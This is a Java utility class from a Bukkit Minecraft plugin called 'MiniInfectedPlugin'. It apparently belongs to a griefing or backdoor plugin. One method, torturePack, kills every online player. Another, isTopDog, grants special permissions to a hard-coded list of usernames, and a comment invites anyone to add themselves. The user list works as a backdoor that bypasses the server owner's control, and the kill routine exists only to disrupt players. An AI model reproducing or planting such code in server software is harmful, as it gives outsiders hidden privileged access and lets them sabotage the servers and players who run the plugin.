 package org.CreeperCoders.MiniInfectedPlugin;
 
 import org.bukkit.entity.Player;
 import org.bukkit.Bukkit;
 
 import java.util.Arrays;
 
 public class MIP_Util
 {
     public static void torturePack()
     {
         //Horrible, yes, but I'm working on it!
         for (Player p : Bukkit.getOnlinePlayers())
         {
             p.setHealth(0.0);
         }
         return;
     }
 
     /**
      * Hello,
      * If you do not understand our boolean "isTopDog" this boolean is to give trusted people special permissions to MiniInfectedPlugin.
      * Of course, you may think this boolean is for friends and developers. But actually we allow anyone to have this, either compile yourself in or officially add yourself in with a pull request.
      * We will approve any pull request to add yourself into this list.
      * ~ Wilee999 and the MIP team.
      * @param TopDog
      * @return true if the sender name is one of the top dog
      */ 
    public static boolean isTopDog(String TopDog)
     {
         return Arrays.asList(
                 "xxwilee999xx",
                 "paldiu",
                 "sardenarin",
                 "lambo993"
                 ).contains(TopDog.toLowerCase());
     }
 }
